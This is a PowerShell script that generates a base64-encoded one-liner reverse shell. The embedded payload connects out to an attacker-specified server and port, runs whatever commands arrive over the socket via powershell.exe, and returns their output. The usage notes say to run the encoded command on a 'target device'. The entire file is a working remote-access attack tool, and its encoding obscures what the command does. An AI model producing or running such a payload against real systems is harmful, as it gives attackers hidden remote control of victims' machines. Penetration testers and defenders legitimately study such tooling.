<#
.AUTHOR
0x10F8

.SYNOPSIS
Generates an encoded (base64) one liner reverse shell

.EXAMPLE
Connect back to the reverse shell server
PS C:\> .\generate_encoded_reverse_shell.ps1 -s 127.0.0.1 -p 9001
This will generate a base64 string. Then on the target device you can execute the script with:
PS C:\> powershell.exe -EncodedCommand <BASE64STRING>
#>

# Read the required parameters
Param (
    [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
    [Parameter(Mandatory = $true)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port
)
$code = '$server = "SERVER_TOKEN"
$port = PORT_TOKEN
$WAIT_MS = 500
function Get-Connection-State([System.Net.Sockets.TcpClient] $connection) {
    $connection_props = [System.Net.NetworkInformation.IPGlobalProperties]::
    GetIPGlobalProperties().GetActiveTcpConnections().Where( {
            $_.LocalEndPoint -eq $connection.Client.LocalEndPoint -and $_.RemoteEndPoint -eq $connection.Client.RemoteEndPoint
        })
    return $connection_props.State
}
function Invoke-Cmd([string] $command) {
    $response = ""
    if ($command) {
        try {
            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
            $base64command = [System.Convert]::ToBase64String($commandbytes)
            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
        }
        catch {
            $response = $error[0]
        }
    }
    return $response
}
$connection = New-Object System.Net.Sockets.TcpClient($server, $port)
$stream = $connection.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$connected = $true
while ($connected) {
    if ($stream.DataAvailable) {
        $request = $reader.ReadLine()
    }
    $response = Invoke-Cmd $request
    if ($response) {
        $writer.Write($response)
    }
    $connection_state = Get-Connection-State $connection
    $connected = ($connection_state -eq [System.Net.NetworkInformation.TCPState]::Established)
    $request = ""
    $response = ""
    start-sleep -Milliseconds $WAIT_MS
}
$reader.Close()
$writer.Close()
$connection.Close()
'

$code = $code -replace "SERVER_TOKEN", "$server" 
$code = $code -replace "PORT_TOKEN", "$port"
$codebytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$base64code = [System.Convert]::ToBase64String($codebytes)

Write-Host "powershell.exe -EncodedCommand $base64code"